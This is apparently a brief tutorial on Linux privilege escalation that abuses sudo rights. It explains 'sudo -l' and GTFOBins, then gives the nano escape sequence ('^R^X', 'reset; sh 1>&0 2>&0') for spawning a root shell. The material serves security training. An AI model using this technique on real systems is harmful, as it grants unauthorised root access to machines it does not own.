SUDO :

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the "sudo -l" command.

![sudol](https://user-images.githubusercontent.com/94765997/162626342-604f13a4-bda5-4060-9e6c-168e41dcef65.png)



https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

Let's try with nano command  :


![11](https://user-images.githubusercontent.com/94765997/162626454-50dbd529-6bb4-464c-b907-b97589aa1296.png)

and sudo function : 


![12](https://user-images.githubusercontent.com/94765997/162626515-9683d138-0778-48bc-8f4b-55fcf24274a4.png)

After access it over SSH with the low-privilege user run :

    sudo nano
    ^R^X
and execute command :

    reset; sh 1>&0 2>&0
 
 ![sudonano](https://user-images.githubusercontent.com/94765997/162626675-9763986d-295f-4540-9d21-465e2a545e47.png)
 
 and get root privileges :
 
 

 
![13](https://user-images.githubusercontent.com/94765997/162626746-cec26f2a-3bf9-4d93-8e0a-1caf8766fedb.png)
